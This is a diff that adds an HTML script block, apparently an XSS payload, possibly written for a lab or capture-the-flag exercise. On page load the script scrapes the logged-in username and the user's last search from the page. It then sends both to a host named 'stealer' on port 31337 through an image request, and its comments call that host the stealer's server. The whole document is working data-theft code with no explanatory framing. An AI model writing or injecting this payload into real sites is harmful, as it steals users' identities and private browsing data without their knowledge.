@@ -1,0 +1,54 @@
+<script>
+(function(){
+  // trims and removes trailing punctuation
+  const strip = s => (s || '').trim().replace(/[.,;:!?]+$/, '');
+
+  // returns true for non-empty non-tag search strings
+  const isValidSearchTerm = s =>
+    typeof s === 'string' &&
+    s.trim().length > 0 &&
+    // make sure it doesn't contain angle brackets or percent signs (tags/encodings)
+    !/[<%]/.test(s) &&
+    /[A-Za-z0-9]/.test(s);
+
+  // finds the username from the page
+  function getUsername(){
+    const bodyText = document.body && document.body.innerText || '';
+    const m = bodyText.match(/Logged in as\s+([^\n]+)/i);
+    return m ? strip(m[1]) : '';
+  }
+
+  // finds the last legitimate search query from the history list
+  function getLastSearchFromHistory(){
+    const historyContainer = document.getElementById('history-list');
+    if (!historyContainer) return '';
+    const historyLinks = historyContainer.querySelectorAll('a.history-item, a.list-group-item[href^="search?q="], a[href*="search?q="]');
+    for (const link of historyLinks){
+      const linkText = (link.textContent || '').trim();
+      if (isValidSearchTerm(linkText)) return linkText.split(/\r?\n/)[0].trim();
+    }
+    return '';
+  }
+
+  // sends the extracted data to the stealer's server
+  function sendToStealer(username, search){
+    const url = 'http://stealer:31337/?stolen_user=' + encodeURIComponent(username||'') +
+                '&last_search=' + encodeURIComponent(search||'');
+    new Image().src = url;
+  }
+
+  function run(){
+    const extractedUsername = getUsername();
+    const extractedSearch = getLastSearchFromHistory();
+    console.log('Sending to stealer:', {extractedUsername, extractedSearch});
+    sendToStealer(extractedUsername, extractedSearch);
+  }
+
+  if (document.readyState === 'loading') {
+    // wait until the DOM is fully loaded
+    document.addEventListener('DOMContentLoaded', ()=>setTimeout(run,100), {once:true});
+  } else {
+    setTimeout(run,100);
+  }
+})();
+</script>
